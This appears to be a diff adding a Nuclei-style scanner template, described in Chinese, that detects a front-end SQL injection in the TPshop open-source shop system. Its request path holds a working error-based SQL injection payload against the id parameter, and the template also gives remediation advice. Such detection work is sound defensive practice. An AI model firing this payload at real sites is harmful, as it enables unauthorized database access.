@@ -1,0 +1,33 @@
+id: TpShop-Sqli
+info:
+  name: TPSHOP SQLi
+  author:
+  - l0ne1y
+  description: |-
+    TPshop开源商城系统前台SQL注入
+    TPshop开源商城系统前台存在SQL注入漏洞
+    在Web程序中，通常会使用SQL指令来查询、更新数据库数据，通常查询或者更新数据会带有一些条件，而这些条件通常是提供给用户输入的，那么恶意用户即可通过修改相关条件来执行恶意的SQL指令来获取或更新数据库的数据，甚至在数据库账号权限较高的情况下，可以插入恶意SQL指令来调用数据库中的特殊函数来向服务器读、写文件或者执行操作系统命令。
+  severity: high
+  remediation: |-
+    官方修复方案：
+    1、升级系统至无漏洞版本，或于官网下载安全补丁
+
+    临时修复方案：
+    1、将I('get.id')改为I('get.id/d')
+    2、使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。
+    3、对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。
+requests:
+- matchers:
+  - type: word
+    words:
+    - '{{verify}}'
+  - type: status
+    status:
+    - 500
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/mobile/index/index2/id/1) and (select 1 from (select count(*),concat(0x7e,(select
+    {{verify}}),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a)--'
+  method: GET
+variables:
+  verify: '{{md5(rand_text_alphanumeric(8,""))}}'
